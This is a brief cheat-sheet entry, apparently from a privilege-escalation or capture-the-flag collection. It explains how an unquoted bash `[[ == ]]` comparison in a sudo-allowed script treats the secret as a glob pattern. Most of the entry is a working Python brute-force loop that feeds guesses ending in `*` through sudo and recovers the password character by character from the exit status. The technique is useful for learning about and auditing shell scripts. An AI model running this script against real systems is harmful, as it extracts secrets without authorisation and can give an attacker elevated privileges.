# bash Glob-Match Password Check Brute Force

If a `sudo`-allowed script compares your input to a secret with `[[ $INPUT == $SECRET ]]` instead of `[ "$INPUT" = "$SECRET" ]`, the right-hand side is evaluated as a **glob pattern**, not a literal string — append `*` and brute-force one character at a time, checking the script's exit status:

```python
import string, os
chars = string.ascii_letters + string.digits
password = ''
while True:
    for c in chars:
        if os.system(f"echo {password}{c}* | sudo /path/to/script.sh >/dev/null 2>&1") == 0:
            password += c
            break
    else:
        break
print(password)
```
Each correct guess matches because `<prefix><next-char>*` still globs against the true secret; a wrong character never matches regardless of the trailing `*`.
